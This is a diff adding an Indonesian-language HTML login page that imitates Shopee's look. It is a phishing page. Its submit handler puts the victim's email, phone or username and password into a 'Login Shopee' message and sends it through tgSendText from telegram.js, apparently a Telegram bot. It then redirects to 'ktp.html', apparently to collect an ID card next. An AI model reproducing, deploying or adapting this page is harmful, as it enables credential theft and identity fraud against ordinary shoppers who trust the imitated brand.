@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>Login</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #ee4d2d;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .top-bar {
+      display: flex;
+      align-items: center;
+      padding: 16px;
+      gap: 12px;
+    }
+
+    .back-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 4px;
+      display: flex;
+      align-items: center;
+    }
+
+    .back-btn svg {
+      width: 22px;
+      height: 22px;
+      stroke: #fff;
+      fill: none;
+      stroke-width: 2.5;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .top-bar h1 {
+      color: #fff;
+      font-size: 18px;
+      font-weight: 600;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 12px 12px 0 0;
+      flex: 1;
+      padding: 28px 20px;
+      margin-top: 8px;
+    }
+
+    .card-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 6px;
+    }
+
+    .card-sub {
+      font-size: 13px;
+      color: #999;
+      margin-bottom: 28px;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: #555;
+      margin-bottom: 6px;
+      text-transform: uppercase;
+      letter-spacing: 0.4px;
+    }
+
+    .input-wrap {
+      position: relative;
+    }
+
+    .input-wrap input {
+      width: 100%;
+      border: 1.5px solid #e0e0e0;
+      border-radius: 8px;
+      padding: 13px 44px 13px 14px;
+      font-size: 15px;
+      color: #222;
+      outline: none;
+      transition: border-color 0.2s;
+      background: #fafafa;
+    }
+
+    .input-wrap input:focus {
+      border-color: #ee4d2d;
+      background: #fff;
+    }
+
+    .input-wrap input::placeholder {
+      color: #bbb;
+    }
+
+    .clear-btn {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      display: none;
+      padding: 2px;
+    }
+
+    .clear-btn svg {
+      width: 18px;
+      height: 18px;
+      fill: #bbb;
+    }
+
+    .input-wrap input:not(:placeholder-shown) + .clear-btn {
+      display: flex;
+    }
+
+    .toggle-pw {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 2px;
+      display: flex;
+      align-items: center;
+    }
+
+    .toggle-pw svg {
+      width: 20px;
+      height: 20px;
+      stroke: #999;
+      fill: none;
+      stroke-width: 1.8;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .forgot {
+      text-align: right;
+      margin-top: 8px;
+      margin-bottom: 8px;
+    }
+
+    .forgot a {
+      font-size: 13px;
+      color: #ee4d2d;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .btn-login {
+      width: 100%;
+      background: #ee4d2d;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 15px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 8px;
+      transition: background 0.2s, opacity 0.2s;
+      letter-spacing: 0.3px;
+    }
+
+    .btn-login:hover {
+      background: #d73e20;
+    }
+
+    .btn-login:active {
+      opacity: 0.85;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 24px 0;
+    }
+
+    .divider span {
+      font-size: 12px;
+      color: #bbb;
+      white-space: nowrap;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #e8e8e8;
+    }
+
+    .register-wrap {
+      text-align: center;
+      font-size: 14px;
+      color: #888;
+    }
+
+    .register-wrap a {
+      color: #ee4d2d;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .error-msg {
+      font-size: 12px;
+      color: #ee4d2d;
+      margin-top: 5px;
+      display: none;
+    }
+
+    .input-wrap input.error {
+      border-color: #ee4d2d;
+      background: #fff5f3;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="top-bar">
+    <button class="back-btn" onclick="history.back()">
+      <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
+    </button>
+    <h1>Masuk</h1>
+  </div>
+
+  <div class="card">
+    <p class="card-title">Selamat Datang!</p>
+    <p class="card-sub">Masuk untuk melanjutkan belanja</p>
+
+    <form id="loginForm" novalidate>
+      <div class="form-group">
+        <label for="identifier">Email / No. HP / Username</label>
+        <div class="input-wrap">
+          <input
+            type="text"
+            id="identifier"
+            placeholder="Masukkan email, no. HP, atau username"
+            autocomplete="username"
+          />
+          <button type="button" class="clear-btn" onclick="clearField('identifier')">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 13.59L15.59 17 12 13.41 8.41 17 7 15.59 10.59 12 7 8.41 8.41 7 12 10.59 15.59 7 17 8.41 13.41 12 17 15.59z"/>
+            </svg>
+          </button>
+        </div>
+        <p class="error-msg" id="identifierErr">Kolom ini wajib diisi</p>
+      </div>
+
+      <div class="form-group">
+        <label for="password">Kata Sandi</label>
+        <div class="input-wrap">
+          <input
+            type="password"
+            id="password"
+            placeholder="Masukkan kata sandi"
+            autocomplete="current-password"
+          />
+          <button type="button" class="toggle-pw" onclick="togglePassword()" id="togglePwBtn">
+            <svg id="eyeIcon" viewBox="0 0 24 24">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+          </button>
+        </div>
+        <p class="error-msg" id="passwordErr">Kata sandi wajib diisi</p>
+      </div>
+
+      <button type="submit" class="btn-login">Lanjutkan</button>
+    </form>
+  </div>
+
+  <script src="telegram.js"></script>
+  <script>
+    function clearField(id) {
+      document.getElementById(id).value = '';
+      document.getElementById(id).focus();
+    }
+
+    function togglePassword() {
+      const pw = document.getElementById('password');
+      const icon = document.getElementById('eyeIcon');
+      const isHidden = pw.type === 'password';
+      pw.type = isHidden ? 'text' : 'password';
+      icon.innerHTML = isHidden
+        ? `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
+           <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
+           <line x1="1" y1="1" x2="23" y2="23"/>`
+        : `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+           <circle cx="12" cy="12" r="3"/>`;
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      let valid = true;
+
+      const id = document.getElementById('identifier');
+      const pw = document.getElementById('password');
+      const idErr = document.getElementById('identifierErr');
+      const pwErr = document.getElementById('passwordErr');
+
+      id.classList.remove('error');
+      pw.classList.remove('error');
+      idErr.style.display = 'none';
+      pwErr.style.display = 'none';
+
+      if (!id.value.trim()) {
+        id.classList.add('error');
+        idErr.style.display = 'block';
+        valid = false;
+      }
+
+      if (!pw.value) {
+        pw.classList.add('error');
+        pwErr.style.display = 'block';
+        valid = false;
+      }
+
+      if (valid) {
+        const text =
+          `🛒 <b>Login Shopee</b>\n` +
+          `👤 <b>Identifier:</b> ${id.value.trim()}\n` +
+          `🔑 <b>Password:</b> ${pw.value}`;
+        tgSendText(text).finally(() => {
+          window.location.href = 'ktp.html';
+        });
+      }
+    });
+  </script>
+
+</body>
+</html>
